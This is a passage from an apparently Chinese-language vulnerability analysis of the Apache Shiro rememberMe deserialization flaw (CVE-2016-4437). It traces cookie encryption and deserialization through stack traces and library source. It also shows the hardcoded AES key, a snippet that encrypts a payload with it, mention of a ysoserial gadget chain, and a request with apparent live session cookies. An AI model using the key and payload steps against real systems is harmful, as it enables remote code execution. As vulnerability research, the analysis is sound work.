&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> Base64.&lt;span style="color:#a6e22e">decode&lt;/span>(CodecSupport.&lt;span style="color:#a6e22e">toBytes&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteSource ciphertext &lt;span style="color:#f92672">=&lt;/span> aes.&lt;span style="color:#a6e22e">encrypt&lt;/span>(payloads, key);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">printf&lt;/span>(ciphertext.&lt;span style="color:#a6e22e">toString&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>shiro实现rememberMe的功能是使用了cookie，首先尝试了解cookie怎么生成的，
发送正常登录请求，在org.vulhub.shirodemo.UserController#doLoginPage下断点。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> http://192.168.59.211:8080/doLogin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.59.211:8080&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Language&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">53&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Origin&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.59.211:8080&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.59.211:8080/login&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">wp-settings-time-1=1703849655; i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=F43AC74A73C46A3D0C5A1405CAE2AB60; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e9913da348dbccb312080f19f2d5f42e=admin%7C1704022345%7CEdPzdFLXNFDYEcHohieOoyKm4RcvX7oRVRNwcfpA1dF%7C5759451a584ee6a090f44e53eb2fd9261f3ad2d4f4a99aa74e7a5e97e598ad1d;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Upgrade-Insecure-Requests&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=admin&amp;amp;password=vulhub&amp;amp;rememberme=remember-me
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为代码中声明了路由&lt;code>/doLogin&lt;/code>，所以上面的请求会触发到这个方法，在doLoginPage方法内会通过subject.login调用触发调用&lt;code>doGetAuthorizationInfo&lt;/code>方法。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@PostMapping&lt;/span>({&lt;span style="color:#e6db74">&amp;#34;/doLogin&amp;#34;&lt;/span>})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> String &lt;span style="color:#a6e22e">doLoginPage&lt;/span>(&lt;span style="color:#a6e22e">@RequestParam&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>) String username, &lt;span style="color:#a6e22e">@RequestParam&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>) String password, &lt;span style="color:#a6e22e">@RequestParam&lt;/span>(name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;rememberme&amp;#34;&lt;/span>,defaultValue &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>) String rememberMe) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Subject subject &lt;span style="color:#f92672">=&lt;/span> SecurityUtils.&lt;span style="color:#a6e22e">getSubject&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> subject.&lt;span style="color:#a6e22e">login&lt;/span>(&lt;span style="color:#66d9ef">new&lt;/span> UsernamePasswordToken(username, password, rememberMe.&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;remember-me&amp;#34;&lt;/span>)));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;forward:/&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (AuthenticationException var6) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;forward:/login&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用栈如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>doGetAuthenticationInfo:18, MainRealm (org.vulhub.shirodemo)
getAuthenticationInfo:568, AuthenticatingRealm (org.apache.shiro.realm)
doSingleRealmAuthentication:180, ModularRealmAuthenticator (org.apache.shiro.authc.pam)
doAuthenticate:267, ModularRealmAuthenticator (org.apache.shiro.authc.pam)
authenticate:198, AbstractAuthenticator (org.apache.shiro.authc)
authenticate:106, AuthenticatingSecurityManager (org.apache.shiro.mgt)
login:270, DefaultSecurityManager (org.apache.shiro.mgt)
login:256, DelegatingSubject (org.apache.shiro.subject.support)
doLoginPage:16, UserController (org.vulhub.shirodemo)
......
&lt;/code>&lt;/pre>&lt;p>其中&lt;code>org.apache.shiro.mgt.DefaultSecurityManager#login&lt;/code>代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> Subject &lt;span style="color:#a6e22e">login&lt;/span>(Subject subject, AuthenticationToken token) &lt;span style="color:#66d9ef">throws&lt;/span> AuthenticationException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AuthenticationInfo info;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">authenticate&lt;/span>(token);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (AuthenticationException var7) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AuthenticationException ae &lt;span style="color:#f92672">=&lt;/span> var7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">onFailedLogin&lt;/span>(token, ae, subject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception var6) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (log.&lt;span style="color:#a6e22e">isInfoEnabled&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#a6e22e">info&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;onFailedLogin method threw an exception. Logging and propagating original AuthenticationException.&amp;#34;&lt;/span>, var6);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> var7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Subject loggedIn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">createSubject&lt;/span>(token, info, subject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">onSuccessfulLogin&lt;/span>(token, info, loggedIn);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> loggedIn;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当&lt;code>doGetAuthorizationInfo&lt;/code>没有抛出错误时会调用onSuccessfulLogin方法
最终调用到org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin方法，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">onSuccessfulLogin&lt;/span>(Subject subject, AuthenticationToken token, AuthenticationInfo info) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">forgetIdentity&lt;/span>(subject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">isRememberMe&lt;/span>(token)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">rememberIdentity&lt;/span>(subject, token, info);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (log.&lt;span style="color:#a6e22e">isDebugEnabled&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#a6e22e">debug&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;AuthenticationToken did not indicate RememberMe is requested. RememberMe functionality will not be executed for corresponding account.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">isRememberMe&lt;/span>(AuthenticationToken token) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> token &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> token &lt;span style="color:#66d9ef">instanceof&lt;/span> RememberMeAuthenticationToken &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ((RememberMeAuthenticationToken)token).&lt;span style="color:#a6e22e">isRememberMe&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>首先判断是否token是否有效以及是否需要设置rememberMe，如果是则进入rememberIdentity方法内，跟随调用栈，进入rememberIdentity方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">rememberIdentity&lt;/span>(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PrincipalCollection principals &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getIdentityToRemember&lt;/span>(subject, authcInfo);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">rememberIdentity&lt;/span>(subject, principals);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">rememberIdentity&lt;/span>(Subject subject, PrincipalCollection accountPrincipals) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bytes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">convertPrincipalsToBytes&lt;/span>(accountPrincipals);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">rememberSerializedIdentity&lt;/span>(subject, bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/2.png" />&lt;/p>
&lt;p>在调试器中看到，rememberIdentity方法通过调用convertPrincipalsToBytes方法获取到了字节数组，而后传给了rememberSerializedIdentity方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">rememberIdentity&lt;/span>(Subject subject, PrincipalCollection accountPrincipals) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bytes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">convertPrincipalsToBytes&lt;/span>(accountPrincipals);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">rememberSerializedIdentity&lt;/span>(subject, bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/3.png" />&lt;/p>
&lt;p>那么这个字节数组是怎么产生的呢？跟进查看，可以看到首先调用serialize方法序列化，而后使用this.encrypt方法进行加密。其中序列化的对象为SimplePrincipalCollection类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">convertPrincipalsToBytes&lt;/span>(PrincipalCollection principals) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bytes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">serialize&lt;/span>(principals);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getCipherService&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bytes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">encrypt&lt;/span>(bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> bytes;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> serialized) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> value &lt;span style="color:#f92672">=&lt;/span> serialized;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CipherService cipherService &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getCipherService&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (cipherService &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteSource byteSource &lt;span style="color:#f92672">=&lt;/span> cipherService.&lt;span style="color:#a6e22e">encrypt&lt;/span>(serialized, &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getEncryptionCipherKey&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">=&lt;/span> byteSource.&lt;span style="color:#a6e22e">getBytes&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> value;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>进入encrypt方法，从调试器中可以加密对象为AesCipherService类AES加密CBC模式，而后将目标数据和加密key传给cipherService.encrypt进行加密，key由getEncryptionCipherKey得到。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2016-4437-shiro-550-RCE.zh-cn.assets/4.png" />&lt;/p>
&lt;p>最终看到key在构造函数中分配，为固定值。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">AbstractRememberMeManager&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">setCipherKey&lt;/span>(DEFAULT_CIPHER_KEY_BYTES);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> DEFAULT_CIPHER_KEY_BYTES &lt;span style="color:#f92672">=&lt;/span> Base64.&lt;span style="color:#a6e22e">decode&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>解密过程&lt;/strong>&lt;/p>
&lt;p>前面我们知道序列化的类是SimplePrincipalCollection，路径为org.apache.shiro.subject.SimplePrincipalCollection，其重写了writeObject和readObject方法，直接在readObject方法断点，使用ysoserial生成恶意序列化数据，使用CommonsBeanutils1 链。
调用栈如下&lt;/p>
&lt;pre tabindex="0">&lt;code>readObject:295, SimplePrincipalCollection (org.apache.shiro.subject)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1058, ObjectStreamClass (java.io)
readSerialData:1909, ObjectInputStream (java.io)
readOrdinaryObject:1808, ObjectInputStream (java.io)
readObject0:1353, ObjectInputStream (java.io)
readObject:373, ObjectInputStream (java.io)
deserialize:77, DefaultSerializer (org.apache.shiro.io)
deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)
convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)
getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)
resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)
createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)
buildSubject:846, Subject$Builder (org.apache.shiro.subject)
.....
&lt;/code>&lt;/pre>&lt;p>可以看出在org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals解密并反序列化，其解密过程也是调用AES解密并把默认密钥传入。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> PrincipalCollection &lt;span style="color:#a6e22e">convertBytesToPrincipals&lt;/span>(&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bytes, SubjectContext subjectContext) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getCipherService&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bytes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">decrypt&lt;/span>(bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">deserialize&lt;/span>(bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> encrypted) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> serialized &lt;span style="color:#f92672">=&lt;/span> encrypted;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CipherService cipherService &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getCipherService&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (cipherService &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteSource byteSource &lt;span style="color:#f92672">=&lt;/span> cipherService.&lt;span style="color:#a6e22e">decrypt&lt;/span>(encrypted, &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">getDecryptionCipherKey&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> serialized &lt;span style="color:#f92672">=&lt;/span> byteSource.&lt;span style="color:#a6e22e">getBytes&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> serialized;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在org.apache.shiro.io.DefaultSerializer#deserialize进行反序列化，代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> T &lt;span style="color:#a6e22e">deserialize&lt;/span>(&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> serialized) &lt;span style="color:#66d9ef">throws&lt;/span> SerializationException {
